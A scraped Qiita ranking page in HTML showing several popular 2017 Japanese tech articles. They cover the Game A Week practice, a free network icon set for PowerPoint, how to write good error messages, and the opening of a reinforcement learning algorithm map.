data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43772/9bd4c22d-fffb-aaa4-b4fb-d4b36b9c8064.png"></a></p>

<p>これにより、今後似たようなゲームを作る場合には、かなり楽に実装できるようになったと思います。ノウハウが溜まっていくのも、自分の成長を実感できて楽しいですね。<br>
私の場合は、プログラムを得意としているので、開発効率を上げるツールやライブラリの調査を重点的に行いましたが、絵が描ける人であればアート的な挑戦をしてみたり、作曲ができる人であればサウンド的な挑戦をしてみるのも、良いかもしれません。</p>

<h3>
<span id="2-ゲームを完成させたときの達成感を繰り返し得られる" class="fragment"></span><a href="#2-%E3%82%B2%E3%83%BC%E3%83%A0%E3%82%92%E5%AE%8C%E6%88%90%E3%81%95%E3%81%9B%E3%81%9F%E3%81%A8%E3%81%8D%E3%81%AE%E9%81%94%E6%88%90%E6%84%9F%E3%82%92%E7%B9%B0%E3%82%8A%E8%BF%94%E3%81%97%E5%BE%97%E3%82%89%E3%82%8C%E3%82%8B"><i class="fa fa-link"></i></a>2. ゲームを完成させたときの達成感を繰り返し得られる</h3>

<p>個人ゲーム開発は基本的に締め切りがないので、延々と作り続けることが可能です。<br>
そして、その結果、完成のメドが立たず開発中止することもあります。私自身も、何ヶ月も作り続けたゲームが全然面白くならなったので、お蔵入りさせたことが何度もあります<br>
ですが、「Game A Week」は期限が1週間と決められているので、例えクソゲーでも1週間の作業が無駄になるだけです。クソゲーであっても完成させれば、完成したという達成感が得られます。<br>
極端なことを言うと、 <strong>クソゲーであっても1週間経過すれば次のゲームの開発に移行することができます</strong> 。面白くなるかどうかわからないゲームの開発をズルズルと続けてしまうリスクを回避することができるわけです。</p>

<p>私の場合、作ったゲームは会社で毎週発表しました。そうしたら、毎回なんらかの反応を返してくれる人もいて、それが楽しみでゲームを作り続けることができました。そういう意味では、作ったゲームを公に発表できる場があり、ダイレクトに反応が返ってくる環境があったのは、恵まれていたような気がします。</p>

<h3>
<span id="3-ため込んでいたアイデアをはき出せる" class="fragment"></span><a href="#3-%E3%81%9F%E3%82%81%E8%BE%BC%E3%82%93%E3%81%A7%E3%81%84%E3%81%9F%E3%82%A2%E3%82%A4%E3%83%87%E3%82%A2%E3%82%92%E3%81%AF%E3%81%8D%E5%87%BA%E3%81%9B%E3%82%8B"><i class="fa fa-link"></i></a>3. ため込んでいたアイデアをはき出せる</h3>

<p>私の場合、日頃から作りたいゲームのアイデアをたくさん抱えているのですが、あまり実現はできていませんでした。「なぜ作れなかったのか？」と考えた結果、2つの制約が邪魔をしていることがわかりました。</p>

<ol>
<li>
<strong>時間の制約</strong> ：ゲームを作るにはとても時間がかかる。そのため、実際に作ることができるのは、それらのアイデアの中でも「これは面白い！」と思える厳選したアイデアになってしまう</li>
<li>
<strong>技術的な制約</strong> ：作るのが難しそうなものは最初からあきらめてしまう。自分が作れそうな、実現可能なアイデアを選びがちになる</li>
</ol>

<p>ですが、「Game A Week」は「失敗してクソゲーになっても良い」ので、面白くなるかどうかわからなくても、実験的なアイデアをどんどん試すことができます。<br>
ゲームはある程度、脳内でシミュレートして面白さを検証することができます。しかし本当に面白いかどうかは、やはり作ってみないとわかりません。私の場合、以前からパズルRPGを作ってみたいと思っていましたが、なかなか時間が取れずに悶々としていました。そしてそのアイデアも面白いかどうか分からなかったので、そのゲームを作る時間はないなぁ……、などと思っていました。ですが、「Game A Week」を続けていたときに、そのアイデアを思い出してパズルRPGを作りました。それがターン制のパズルRPG「Super Puzzle RPG」です。</p>

<p><a href="https://camo.qiitausercontent.com/ea0101fb1b0845469fb523bd140dfb5f50d05978/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f34373863363534652d383264632d303539372d363634612d3731323933356235383636632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/ea0101fb1b0845469fb523bd140dfb5f50d05978/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f34373863363534652d383264632d303539372d363634612d3731323933356235383636632e706e67" alt="SuperPuzzleRPG.png" title="SuperPuzzleRPG.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43772/478c654e-82dc-0597-664a-712935b5866c.png"></a></p>

<p>パネルを消すと、その消したパネルの数に応じて敵にダメージを与えることができる、パズドラのようなゲームです。<br>
作った結果、このゲームが面白いものになったのかというと……、正直、いまひとつでした。まあ作る前にすごく面白くなるという確信がなかったので、当たり前といえば、当たり前かもしれません。ですが、「面白くなるかどうかわからない」アイデアを脳内に残したままにしておくよりは、遊べるゲームという形にして頭の中から追い出すと、とてもスッキリします。また「遊べるゲーム」にしたことで、似たようなアイデアを思いついた際、その検証がやりやすくなるのではないかと思います。</p>

<h2>
<span id="game-a-weekの欠点その1" class="fragment"></span><a href="#game-a-week%E3%81%AE%E6%AC%A0%E7%82%B9%E3%81%9D%E3%81%AE1"><i class="fa fa-link"></i></a>Game A Weekの欠点　その1</h2>

<p>とまあ、「Game A Week」の良いところばかりを書いてきましたが、欠点があります。一番大きいのは、やはり <strong>1週間で1本ゲームを作らなければならない</strong> ということです。<br>
このノルマはとてもハードで、「Game A Week」を始めるとそれを中心した生活にならざるを得ません。</p>

<ul>
<li>今週はゲームを作る時間はどうやって確保しようか……？」</li>
<li>「うーん、次回のゲームは何を作ろうか……？」</li>
<li>「来週は時間がないから、Flappy Birdでも作るか……」</li>
</ul>

<p>などと、毎日、夕ごはんのメニューに悩む奥様のごとく、ゲーム開発を常に考えるようになってしまい、日々の生活にプレッシャーがかかります。<br>
この問題への対策は、究極的には「頑張れ！」という根性論しかないのですが、「再利用しやすいように作る」という時間短縮の工夫をしていくのも大切です。</p>

<ul>
<li>タイトル画面やエンディングは毎回同じでよい</li>
<li>ゲーム開始演出やゲームオーバーのリトライ処理は使い回すようにする</li>
<li>BGM / SE は毎回同じものでよい</li>
<li>画像も毎回同じでよい</li>
</ul>

<p>これは私の勝手な解釈ですが、「新しいゲームのアイデアを試すことができれば、素材は全く同じでも良い」と考えています。<br>
そして「再利用しやすい技術」の検証ができるゲームを早めに作っておくのも良いかもしれません。敵のパラメータを設定するのにExcelのような表形式のデータを読み込める仕組みを作っておけば、その後に作るゲームで使い回ししやすいと思います。<br>
私の場合は、自作スクリプトでシューティングの敵のAI (敵の行動・弾幕パターンが定義できる) を実装してからは、シューティングを作るときは、そのスクリプトを使い回して制作時間を短縮できるようになりました。<br>
それと、時間がないときのために「簡単に作れるゲームアイデアをストックしておく」のも有効かもしれません。例えば、ワンタップで遊べるゲーム (Flappy Birdみたいなもの) は時間の確保が難しい忙しい週に作るようにします。逆に（個人的には）時間のかかる、ターンベースのRPGのような非リアルタイムかつシステム寄りのゲームは、時間が取れそうなときに作るようにしました。</p>

<h2>
<span id="game-a-weekの欠点その2" class="fragment"></span><a href="#game-a-week%E3%81%AE%E6%AC%A0%E7%82%B9%E3%81%9D%E3%81%AE2"><i class="fa fa-link"></i></a>Game A Weekの欠点　その2</h2>

<p>「Game A Week」のもう1つの欠点があります。それは、クリアするのに何時間もかかるようなやり込み要素のあるゲームや、複合的なゲームメカニクスを持つゲームを作るのは、期間的に難しいということです。「Game A Week」が向いているのは、ミニゲームであったり、アイデア勝負の一発ネタのゲーム、というような単一のゲームメカニクスを持ったゲームを作ることです。<br>
作りたいゲームが明確に存在していて、技術的な検証も特に不要、と考えているのであれば、「Game A Week」はあまり役に立たないかもしれません。<br>
ただ、</p>

<ul>
<li>新しい環境や技術を試してみたい</li>
<li>（面白くなるかわからないけど）新しいアイデアを試してみたい</li>
<li>作りながら面白いゲームのアイデアを考えたい</li>
</ul>

<p>というように、手を動かしながら色々な実験をしてみたいという方には向いている気がします</p>

<h1>
<span id="参考" class="fragment"></span><a href="#%E5%8F%82%E8%80%83"><i class="fa fa-link"></i></a>参考</h1>

<p>今回の記事を書くにあたって、参考にしたWebページです。</p>

<ul>
<li><a href="https://www.gamasutra.com/blogs/RamiIsmail/20140226/211807/Game_A_Week_Getting_Experienced_At_Failure.php" rel="nofollow noopener" target="_blank">Gamasutra: Rami Ismail's Blog - Game A Week: Getting Experienced At Failure</a></li>
<li><a href="https://www.polygon.com/2014/8/11/5990261/Adriel-wallick-gdc-europe-2014-game-a-week" rel="nofollow noopener" target="_blank">The guidelines for making a game a week, every week</a></li>
<li><a href="http://indiegames.com/2014/02/what_one_dev_learned_while_doi.html" rel="nofollow noopener" target="_blank">What one dev learned while doing a "one game per week" challenge</a></li>
<li><a href="http://aba.hatenablog.com/entry/20140308/p1" rel="nofollow noopener" target="_blank">ABAの日誌 - 一週間に一つミニゲームを作り続けるのに役立つひどいゲームをかろうじてましなゲームにする力</a></li>
<li><a href="http://aba.hatenablog.com/entry/20141223/p1" rel="nofollow noopener" target="_blank">ABAの日誌 - 今年50のゲームを作って分かった面白いゲームを作る方法</a></li>
</ul>

<p>もし、「Game A Week」についてより詳しく知りたいのであれば、これらの記事をたどってみてもよいかもしれません。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">4位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>700</kbd>
		<a target="_blank" href="https://qiita.com/tamura__246/items/554cfa151ec999aa9eac">欲しいものが無いからつくってみました。誰でも使えるオープンソースなネットワークアイコン集</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-01<br />19:15:32</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/43869.html">tamura__246</a>(32件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/43869/profile-images/1473689680">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PowerPoint]</b> <b>[設計]</b> <b>[アイコン]</b> <b>[Webデザイン]</b> <b>[プレゼンテーション]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="概要" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81"><i class="fa fa-link"></i></a>概要</h1>

<p>システム構成図などを作成しようとすると、ユーザーやサーバーの図形を使うことになりますが、ライセンスを気にせずに、タダで使えて、見た目がそれなりによくて、統一感があるものは、なかなか見つからないですよね。無いならつくるしかない、ということでつくってみました。</p>

<p><a href="https://camo.qiitausercontent.com/4db6c956584a5527a77db0a139bc6bdc53c6acd7/68747470733a2f2f6769746875622e636f6d2f6b2d74616d7572612f636f6368612d69636f6e732f7261772f6d61737465722f73616d706c652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/4db6c956584a5527a77db0a139bc6bdc53c6acd7/68747470733a2f2f6769746875622e636f6d2f6b2d74616d7572612f636f6368612d69636f6e732f7261772f6d61737465722f73616d706c652e706e67" alt="sample.png" data-canonical-src="https://github.com/k-tamura/cocha-icons/raw/master/sample.png"></a></p>



<p>この図をつくっているパーツを含むPowerPointも<a href="https://github.com/k-tamura/cocha-icons" rel="nofollow noopener" target="_blank">GitHub</a>に公開したので、ある意味オープンソースです。グループ化を解除すれば、各パーツに分解できます。</p>

<p><a href="https://camo.qiitausercontent.com/006322e386944e037961e099ad2453ae053b982e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333836392f31643637313538322d386163382d393134302d643239352d3230613135333131313231372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/006322e386944e037961e099ad2453ae053b982e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333836392f31643637313538322d386163382d393134302d643239352d3230613135333131313231372e706e67" alt="div.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43869/1d671582-8ac8-9140-d295-20a153111217.png"></a></p>

<p>昨日から作り始めたので、まだ納得のいくものになっていませんが、これからクオリティを上げていきます。</p>

<p>ちなみにWindows 10のPowerPoint2013でつくっているので、LibreOfficeなどでは正常に表示されません。最初からMacかUbuntuで作図した方がもう少しマシなデザインになったと思いますが、職場はWindowsという人が多いと思うので、PowerPointにしました。</p>

<p>まだまだアイコンの数も少ないですが、今後どんどん追加していきます。リクエストがあれば、issueを登録して下さい。</p>

<p><a href="https://camo.qiitausercontent.com/785778f28cec1d0811b897001602d2ca9e12f1de/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333836392f32373439623261342d333633342d386136312d646164612d3563633134336330323362322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/785778f28cec1d0811b897001602d2ca9e12f1de/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333836392f32373439623261342d333633342d386136312d646164612d3563633134336330323362322e706e67" alt="xx.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43869/2749b2a4-3634-8a61-dada-5cc143c023b2.png"></a></p>

<p>など、このページにコメントしていただいても構いません。</p>

<h1>
<span id="使い方" class="fragment"></span><a href="#%E4%BD%BF%E3%81%84%E6%96%B9"><i class="fa fa-link"></i></a>使い方</h1>

<p>アイコンをグリッドの交点に配置して、矢印などで動線を付ければ、分かりやすい図になると思います。アイコンを追加したい場合などは、pptファイルを開いて直接編集して下さい。</p>

<p><a href="https://qiita.com/tamura__246/items/4c7becfd0b4653c0af3e" id="reference-1f12c9d46b0b389c7876">アイコンのトリセツ</a>もご一読下さい。</p>

<h1>
<span id="ライセンス-" class="fragment"></span><a href="#%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9-"><i class="fa fa-link"></i></a>ライセンス <a rel="nofollow noopener" href="http://creativecommons.org/licenses/by-sa/4.0/" target="_blank"><img alt="クリエイティブ・コモンズ・ライセンス" src="https://camo.qiitausercontent.com/b373168dd19d05ea064a266cf9b576ce3dfd6cc4/68747470733a2f2f692e6372656174697665636f6d6d6f6e732e6f72672f6c2f62792d73612f342e302f38387833312e706e67" data-canonical-src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png"></a>
</h1>

<p>このアイコン集は<a rel="nofollow noopener" href="http://creativecommons.org/licenses/by-sa/4.0/" target="_blank">クリエイティブ・コモンズ 表示 - 継承 4.0 国際 ライセンス</a>の下に提供されています(一応)。クリエイティブ・コモンズ・ライセンスを守る範囲であれば、自由に使うことができます。商用利用も可能です。クリエイティブ・コモンズ・ライセンスについては、<a href="https://creativecommons.jp/licenses/" rel="nofollow noopener" target="_blank">こちらのページ</a>を参照下さい。</p>

<p>気に入っていただけたら、GitHubへのスターもお願いします。</p>


</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">5位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>666</kbd>
		<a target="_blank" href="https://qiita.com/castaneai/items/da6baec750370689e2fa">良いエラーメッセージの書き方</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-01<br />02:20:20</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/10713.html">castaneai</a>(30件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/10713/profile-images/1489427173">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[error]</b> <b>[programming]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>エラーには大抵「エラーメッセージ」が付いています。<br>
自分は過去に、エラーメッセージの内容を雑にしてしまい後悔することがよくありました。<br>
その経験から、良いエラーメッセージの書き方を考えました。</p>

<h2>
<span id="エラーメッセージを2つに分類する" class="fragment"></span><a href="#%E3%82%A8%E3%83%A9%E3%83%BC%E3%83%A1%E3%83%83%E3%82%BB%E3%83%BC%E3%82%B8%E3%82%922%E3%81%A4%E3%81%AB%E5%88%86%E9%A1%9E%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>エラーメッセージを2つに分類する</h2>

<p>まず、エラーメッセージといっても次の2つのパターンで大きく異なってきます。</p>

<ul>
<li>(1) ユーザーが見るエラーメッセージ</li>
<li>(2) 開発者が見るエラーメッセージ</li>
</ul>

<h2>
<span id="1-ユーザーが見るエラーメッセージ" class="fragment"></span><a href="#1-%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%81%8C%E8%A6%8B%E3%82%8B%E3%82%A8%E3%83%A9%E3%83%BC%E3%83%A1%E3%83%83%E3%82%BB%E3%83%BC%E3%82%B8"><i class="fa fa-link"></i></a>(1) ユーザーが見るエラーメッセージ</h2>

<h3>
<span id="内部実装のことは書かないようにする" class="fragment"></span><a href="#%E5%86%85%E9%83%A8%E5%AE%9F%E8%A3%85%E3%81%AE%E3%81%93%E3%81%A8%E3%81%AF%E6%9B%B8%E3%81%8B%E3%81%AA%E3%81%84%E3%82%88%E3%81%86%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>内部実装のことは書かないようにする</h3>

<table>
<thead>
<tr>
<th style="text-align: left"></th>
<th style="text-align: left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">NG</td>
<td style="text-align: left">MySQLのクエリ実行に失敗しました 'SELECT * FROM ...'</td>
</tr>
<tr>
<td style="text-align: left">OK</td>
<td style="text-align: left">検索処理でエラーが発生しました</td>
</tr>
</tbody>
</table>

<p>ソースコードの何処か～や、何のライブラリで～といったプログラマーしかわからない情報は書かないようにします。<br>
ユーザー側からすると、謎の英語の羅列が出てきたりしてなんだか怖いですし、悪意のあるユーザーに<strong>不正行為のためのヒントを与えてしまう可能性があり危険です</strong></p>

<p>たとえば、上の「わるい例」では MySQL を使っていることや、どのようなSQL文を実行しているか、テーブル名は…といった情報が見えてしまっているので攻撃のヒントを与えてしまうかもしれません。</p>

<p>もちろん、開発者だけが見られるエラーメッセージの場合は逆になります。（詳しくは後に）</p>

<h3>
<span id="ユーザーの入力が原因の場合はっきりと理由を書く" class="fragment"></span><a href="#%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%81%AE%E5%85%A5%E5%8A%9B%E3%81%8C%E5%8E%9F%E5%9B%A0%E3%81%AE%E5%A0%B4%E5%90%88%E3%81%AF%E3%81%A3%E3%81%8D%E3%82%8A%E3%81%A8%E7%90%86%E7%94%B1%E3%82%92%E6%9B%B8%E3%81%8F"><i class="fa fa-link"></i></a>ユーザーの入力が原因の場合、はっきりと理由を書く</h3>

<table>
<thead>
<tr>
<th style="text-align: left"></th>
<th style="text-align: left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">NG</td>
<td style="text-align: left">入力欄が不正です</td>
</tr>
<tr>
<td style="text-align: left">OK</td>
<td style="text-align: left">ユーザーIDは4文字以上の英数字で入力してください</td>
</tr>
</tbody>
</table>

<p>ユーザーの入力内容が原因の場合、「何が悪かったのか」具体的に出してくれないとユーザーはイライラしてしまいます。</p>

<h2>
<span id="2-開発者が見るエラーメッセージ" class="fragment"></span><a href="#2-%E9%96%8B%E7%99%BA%E8%80%85%E3%81%8C%E8%A6%8B%E3%82%8B%E3%82%A8%E3%83%A9%E3%83%BC%E3%83%A1%E3%83%83%E3%82%BB%E3%83%BC%E3%82%B8"><i class="fa fa-link"></i></a>(2) 開発者が見るエラーメッセージ</h2>

<p>開発者用のエラーメッセージは、ユーザー用とは違って<strong>不具合が起きた場所をできるだけすばやく特定するために、詳しく、具体的にします</strong></p>

<h3>
<span id="エラーに関わる値を具体的に出す" class="fragment"></span><a href="#%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%AB%E9%96%A2%E3%82%8F%E3%82%8B%E5%80%A4%E3%82%92%E5%85%B7%E4%BD%93%E7%9A%84%E3%81%AB%E5%87%BA%E3%81%99"><i class="fa fa-link"></i></a>エラーに関わる値を具体的に出す</h3>

<table>
<thead>
<tr>
<th style="text-align: left"></th>
<th style="text-align: left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">NG</td>
<td style="text-align: left">config file not found</td>
</tr>
<tr>
<td style="text-align: left">OK</td>
<td style="text-align: left">config file not found: /path/to/config.ini</td>
</tr>
</tbody>
</table>

<p>たとえば、「設定ファイルが見つかりませんでした」と言われても「どこの設定ファイルを開こうとしてエラーになったの・・？」と困惑してしまいます。<br>
また、期待した値と実際の値が違った場合は、<strong>xxを期待したが、実際はyyだったのでエラーになりました</strong> というところまで具体的に出しているとわかりやすいです。</p>

<h3>
<span id="原因を特定しやすくしてくれる一文を入れる" class="fragment"></span><a href="#%E5%8E%9F%E5%9B%A0%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%97%E3%82%84%E3%81%99%E3%81%8F%E3%81%97%E3%81%A6%E3%81%8F%E3%82%8C%E3%82%8B%E4%B8%80%E6%96%87%E3%82%92%E5%85%A5%E3%82%8C%E3%82%8B"><i class="fa fa-link"></i></a>原因を特定しやすくしてくれる一文を入れる</h3>

<table>
<thead>
<tr>
<th style="text-align: left"></th>
<th style="text-align: left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">NG</td>
<td style="text-align: left">table "users" not found</td>
</tr>
<tr>
<td style="text-align: left">OK</td>
<td style="text-align: left">table "users" not found. have you init db?</td>
</tr>
</tbody>
</table>

<p>起こったことを伝えることは重要ですが、さらに<strong>「原因はxxなのでは？」「～～を忘れていませんか？」</strong>という提案が入っていると「あぁ～そうか忘れてた！！」って気づきやすいと思います。</p>

<h3>
<span id="正しい文法でなくても英語を使う" class="fragment"></span><a href="#%E6%AD%A3%E3%81%97%E3%81%84%E6%96%87%E6%B3%95%E3%81%A7%E3%81%AA%E3%81%8F%E3%81%A6%E3%82%82%E8%8B%B1%E8%AA%9E%E3%82%92%E4%BD%BF%E3%81%86"><i class="fa fa-link"></i></a>正しい文法でなくても、英語を使う</h3>

<p>これは好みが分かれそうなところですが、自分は自身しか使わないようなものでもエラーメッセージは英語で書くようにしています。<br>
その理由はこんなところです。2つ目はとても個人的な理由ですが・・</p>

<ul>
<li>文字エンコーディング関連の問題にぶつかる可能性がある</li>
<li>vimで日本語入力に切り替えるのがしんどい</li>
</ul>

<p>しかし、普段日本語を書いていると英語でメッセージを書くのは難しいです。そこで、自分は<strong>文法は気にせずに書く</strong>ようにしています。<br>
正しい文法よりも、<strong>何が起きたのか分かれば十分</strong>と思っています。</p>

<p>たとえば、 <code>user(id=1) register fail</code> というエラーメッセージは（おそらく）文法的には変ですが、「ユーザー（ID: 1）、登録、失敗」という単語から何が起きたかはつかめます。</p>

<h3>
<span id="エラーに至るまでの履歴スタックトレース等を表示する" class="fragment"></span><a href="#%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%AB%E8%87%B3%E3%82%8B%E3%81%BE%E3%81%A7%E3%81%AE%E5%B1%A5%E6%AD%B4%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E7%AD%89%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>エラーに至るまでの履歴（スタックトレース等）を表示する</h3>

<p>開発者としては、エラーが発生した際に「どのような経緯でエラーになったのか」が知れると非常に有用です。<br>
大抵のプログラミング実行環境では、スタックトレースを表示する処理が用意されているので、開発者用エラーメッセージにはつけておくと良いでしょう。</p>

<h3>
<span id="複数あるものは自身を識別する値を一緒に表示する" class="fragment"></span><a href="#%E8%A4%87%E6%95%B0%E3%81%82%E3%82%8B%E3%82%82%E3%81%AE%E3%81%AF%E8%87%AA%E8%BA%AB%E3%82%92%E8%AD%98%E5%88%A5%E3%81%99%E3%82%8B%E5%80%A4%E3%82%92%E4%B8%80%E7%B7%92%E3%81%AB%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>複数あるものは、自身を識別する値を一緒に表示する</h3>

<table>
<thead>
<tr>
<th style="text-align: left"></th>
<th style="text-align: left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">NG</td>
<td style="text-align: left">user register fail</td>
</tr>
<tr>
<td style="text-align: left">OK</td>
<td style="text-align: left">[ID: 12345]user register fail</td>
</tr>
</tbody>
</table>

<p>登録ユーザーや、マルチスレッドといった複数存在するものを扱っている場合、<strong>「エラーが発生したのは複数あるうちのどの個体か」</strong>を知ることで超探しやすくなります。<br>
ユーザーIDや、スレッドID、IPアドレスなど個体を特定できるものはできるだけ一緒に入れましょう。</p>

<h3>
<span id="発生時刻を細かく表示する" class="fragment"></span><a href="#%E7%99%BA%E7%94%9F%E6%99%82%E5%88%BB%E3%82%92%E7%B4%B0%E3%81%8B%E3%81%8F%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>発生時刻を細かく表示する</h3>

<p>気がついたらエラーメッセージがたくさん出ていた、という状況の場合<strong>「いつ発生したエラーなのか」</strong>は重要な情報になります。<br>
特に長時間起動するサーバー等ではログに複数のエラーメッセージが並ぶこともよくあるので、秒より細かい単位までしっかり時刻を表示しておくと良いでしょう。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">6位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>642</kbd>
		<a target="_blank" href="https://qiita.com/sugulu/items/3c7d6cbe600d455e853b">これから強化学習を勉強する人のための「強化学習アルゴリズム・マップ」と、実装例まとめ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-30<br />05:26:09</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/191401.html">sugulu</a>(11件の記事)<br />(都内IT企業 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/191401/profile-images/1509357969">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Python]</b> <b>[機械学習]</b> <b>[DeepLearning]</b> <b>[強化学習]</b> <b>[TensorFlow]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>これから強化学習を勉強したい人に向けて、「どんなアルゴリズムがあるのか」、「どの順番で勉強すれば良いのか」を示した強化学習アルゴリズムの「学習マップ」を作成しました。</p>

<p>さらに、各手法を実際にどう実装すれば良いのかを、簡単な例題を対象に実装しました。<br>
本記事では、ひとつずつ解説します。</p>

<p><a href="https://camo.qiitausercontent.com/9b942a6dfd0333cb71f42483e14750abe6cad154/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39626261666464622d376232622d653236622d393934652d6139376539623462343937642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9b942a6dfd0333cb71f42483e14750abe6cad154/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39626261666464622d376232622d653236622d393934652d6139376539623462343937642e706e67" alt="RLmap.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/9bbafddb-7b2b-e26b-994e-a97e9b4b497d.png"></a></p>

<p>オレンジ枠の手法は、実装例を紹介します。</p>

<p>※今回マップを作るにあたっては、以下の文献を参考にしました。<br>
●<a href="https://www.amazon.co.jp/%E9%80%9F%E7%BF%92-%E5%BC%B7%E5%8C%96%E5%AD%A6%E7%BF%92-%E5%9F%BA%E7%A4%8E%E7%90%86%E8%AB%96%E3%81%A8%E3%82%A2%E3%83%AB%E3%82%B4%E3%83%AA%E3%82%BA%E3%83%A0-%E3%83%81%E3%83%A7%E3%83%90-%E3%82%B5%E3%83%91%E3%82%B7%E3%83%90%E3%83%AA/dp/4320124227" rel="nofollow noopener" target="_blank">速習 強化学習: 基礎理論とアルゴリズム（書籍）</a><br>
●<a href="https://arxiv.org/pdf/1708.07902.pdf" rel="nofollow noopener" target="_blank">Deep Learning for Video Game Playing</a></p>

<h1>
<span id="強化学習とは" class="fragment"></span><a href="#%E5%BC%B7%E5%8C%96%E5%AD%A6%E7%BF%92%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>強化学習とは</h1>

<p>強化学習は、画像識別のような教師あり学習や、クラスタリングのような教師なし学習とは少し異なる、機械学習の分野です。</p>

<p>最終的に達成したいゴールはあるけれど、そこにいたる詳細な制御手法は分からないときに、ゴールできたかどうかをベースに、制御手法を構築する学習手法です。</p>

<p>例えばぶつからない車の自動運転技術の開発では、「センサーで車間距離が○ mになったら、ブレーキをさせる」というのは、ルールベースの制御です。</p>

<p>一方で、実際に車を何度もシミュレーションや実車で走らせて、ぶつかった場合は改善し、ぶつからなかった場合はその制御手法を採用し、何度も試行錯誤しながら、ぶつからないというゴールを達成させる学習手法が、強化学習です。</p>

<p>強化学習は主に「何かの制御」や「対戦型ゲームのアルゴリズム」に使用されることが多い手法です。</p>

